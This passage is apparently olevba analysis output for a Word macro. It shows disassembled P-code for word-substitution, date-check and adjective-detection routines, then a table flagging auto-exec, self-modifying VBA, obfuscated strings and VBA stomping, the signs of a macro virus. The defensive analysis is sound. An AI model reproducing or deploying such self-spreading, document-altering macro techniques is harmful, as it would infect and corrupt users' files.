' 	Ld CEnd$ 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld CEnd$ 
' 	FnLen 
' 	ArgsLd Mid$$ 0x0003 
' 	St MyEnd$ 
' Line #192:
' 	Ld MyEnd$ 
' 	Ld CEnd$ 
' 	Eq 
' 	IfBlock 
' Line #193:
' 	LitVarSpecial (True)
' 	St Changed 
' Line #194:
' 	Ld c 
' 	SelectCase 
' Line #195:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #196:
' 	LitDI2 0x0022 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora1$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #197:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #198:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora2$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #199:
' 	EndSelect 
' Line #200:
' 	Ld Spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #201:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Spaces 
' 	For 
' Line #202:
' 	Ld tw$ 
' 	LitStr 0x0001 " "
' 	Add 
' 	St tw$ 
' Line #203:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	NextVar 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	Ld ts 
' 	ArgsLd CapFirst 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld tw$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	Ld tw$ 
' 	LitDI2 0x0002 
' 	Ld tw$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St tw$ 
' 	EndIf 
' Line #206:
' 	LitDI2 0x000C 
' 	St I 
' Line #207:
' 	LitDI2 0x0002 
' 	St c 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #210:
' 	Wend 
' Line #211:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #212:
' 	Wend 
' Line #213:
' 	EndIfBlock 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	Ld tw$ 
' 	St TrunslateWord$ 
' Line #216:
' 	EndFunc 
' Line #217:
' Line #218:
' 	FuncDefn (Function CheckSpace(csp As String) As Integer)
' Line #219:
' 	LitDI2 0x0000 
' 	St spp 
' Line #220:
' 	Ld csp 
' 	FnLen 
' 	St n 
' Line #221:
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	IfBlock 
' Line #222:
' 	Ld csp 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Paren 
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	Paren 
' 	And 
' 	While 
' Line #223:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Sub 
' 	St n 
' Line #224:
' 	Ld spp 
' 	LitDI2 0x0001 
' 	Add 
' 	St spp 
' Line #225:
' 	Wend 
' Line #226:
' 	EndIfBlock 
' Line #227:
' 	Ld spp 
' 	St CheckSpace 
' Line #228:
' 	EndFunc 
' Line #229:
' Line #230:
' 	FuncDefn (Function CapFirst(cf As String) As Boolean)
' Line #231:
' 	LitVarSpecial (False)
' 	St cfs 
' Line #232:
' 	Ld cf 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	Ld cf 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cfs 
' 	EndIf 
' Line #233:
' 	Ld cfs 
' 	St CapFirst 
' Line #234:
' 	EndFunc 
' Line #235:
' Line #236:
' 	FuncDefn (Function CheckDoubleN_Miss(cdn As String) As Boolean)
' Line #237:
' 	LitVarSpecial (False)
' 	St cdbn 
' Line #238:
' 	Ld cdn 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Ge 
' 	IfBlock 
' Line #239:
' 	Ld cdn 
' 	LitDI2 0x0001 
' 	Ld cdn 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St st3$ 
' Line #240:
' 	Ld cdn 
' 	LitDI2 0x0001 
' 	Ld cdn 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St st2$ 
' Line #241:
' 	Ld cdn 
' 	FnLen 
' 	LitDI2 0x0005 
' 	Gt 
' 	IfBlock 
' Line #242:
' 	Ld st2$ 
' 	Ld st2$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0003 
' 	St lst2$ 
' Line #243:
' 	Ld st3$ 
' 	Ld st3$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0003 
' 	St lst3$ 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	LitVarSpecial (False)
' 	St missed 
' Line #246:
' 	LitDI2 0x0001 
' 	St False 
' Line #247:
' 	Ld False 
' 	LitDI2 0x0008 
' 	Le 
' 	While 
' Line #248:
' 	Ld st2$ 
' 	Ld False 
' 	ArgsLd Miss$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St missed 
' 	EndIf 
' Line #249:
' 	Ld st3$ 
' 	Ld False 
' 	ArgsLd Miss$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St missed 
' 	EndIf 
' Line #250:
' 	Ld missed 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	St False 
' 	EndIf 
' Line #251:
' 	Ld False 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #252:
' 	Wend 
' Line #253:
' 	Ld lst2$ 
' 	LitStr 0x0002 "íí"
' 	Eq 
' 	Ld lst3$ 
' 	LitStr 0x0002 "íí"
' 	Eq 
' 	Or 
' 	Ld missed 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cdbn 
' 	EndIf 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	Ld cdbn 
' 	St CheckDoubleN_Miss 
' Line #256:
' 	EndFunc 
' Line #257:
' Line #258:
' 	FuncDefn (Function MyDate() As Boolean)
' Line #259:
' 	Ld Date$ 
' 	St dt$ 
' Line #260:
' 	LitDI2 0x0001 
' 	Ld dt$ 
' 	LitStr 0x0002 "15"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MyDate 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St MyDate 
' 	EndIf 
' Line #261:
' 	EndFunc 
' Line #262:
' Line #263:
' Line #264:
' 	FuncDefn (Function CheckAdjective(adj As String) As Boolean)
' Line #265:
' 	LitVarSpecial (False)
' 	St cadj 
' Line #266:
' 	SetStmt 
' 	Ld adj 
' 	ArgsLd SynonymInfo 0x0001 
' 	Set mySynInfo 
' Line #267:
' 	Ld mySynInfo 
' 	MemLd PartOfSpeechList 
' 	St myPos 
' Line #268:
' 	Ld myPos 
' 	FnUBound 0x0000 
' 	St I 
' Line #269:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ArgsLd myPos 0x0001 
' 	Ld wdAdjective 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cadj 
' 	EndIf 
' 	EndIf 
' Line #270:
' 	Ld cadj 
' 	St CheckAdjective 
' Line #271:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

